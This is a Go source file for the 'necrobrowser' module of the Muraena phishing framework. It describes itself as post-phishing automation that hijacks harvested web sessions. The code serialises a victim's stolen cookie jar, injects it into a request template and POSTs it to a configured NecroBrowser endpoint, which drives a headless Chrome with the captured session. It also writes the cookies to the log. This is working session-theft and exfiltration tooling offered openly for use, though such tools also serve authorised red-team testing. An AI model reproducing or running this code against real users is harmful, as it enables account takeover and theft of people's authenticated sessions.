package necrobrowser

import (
	"encoding/json"
	"io/ioutil"
	"net/http"
	"strings"

	"gopkg.in/resty.v1"

	"github.com/muraenateam/muraena/session"
)

const (
	// Name of this module
	Name = "necrobrowser"

	// Description of this module
	Description = "Post-phishing automation that hijacks the harvested web session in a dockerized Chrome Headless"

	// Author of this module
	Author = "Muraena Team"

	CookiePlaceholder = "%%%COOKIES%%%"
)

// Necrobrowser module
type Necrobrowser struct {
	session.SessionModule

	Enabled  bool
	Endpoint string
	Profile  string

	Request string
}

// Name returns the module name
func (module *Necrobrowser) Name() string {
	return Name
}

// Description returns the module description
func (module *Necrobrowser) Description() string {
	return Description
}

// Author returns the module author
func (module *Necrobrowser) Author() string {
	return Author
}

// Prompt prints module status based on the provided parameters
func (module *Necrobrowser) Prompt(what string) {}

// Load configures the module by initializing its main structure and variables
func Load(s *session.Session) (m *Necrobrowser, err error) {

	m = &Necrobrowser{
		SessionModule: session.NewSessionModule(Name, s),
		Enabled:       s.Config.NecroBrowser.Enabled,
	}

	if !m.Enabled {
		m.Debug("is disabled")
		return
	}

	config := s.Config.NecroBrowser
	m.Endpoint = config.Endpoint

	m.Profile = config.Profile
	bytes, err := ioutil.ReadFile(m.Profile)
	if err != nil {
		m.Warning("Error reading profile file %s: %s", m.Profile, err)
		m.Enabled = false
		return
	}

	m.Request = string(bytes)

	return
}

func (module *Necrobrowser) InstrumentNecroBrowser(cookieJar []http.Cookie) (err error) {
	c, err := json.MarshalIndent(cookieJar, "", "\t")
	if err != nil {
		module.Warning("Error marshalling the cookies: %s", err)
		return
	}

	module.Warning("Jar: %+v", cookieJar)
	module.Warning("Json: %+v", c)
	module.Warning("Json: %+v", string(c))

	cookiesJSON := string(c)

	// Inject cookies
	module.Warning(module.Request)
	module.Request = strings.ReplaceAll(module.Request, CookiePlaceholder, cookiesJSON)
	module.Warning(module.Request)

	resp, err := resty.R().SetBody(module.Request).Post(module.Endpoint)
	if err != nil {
		return
	}

	module.Info("NecroBrowser Response: %+v", resp)
	return
}
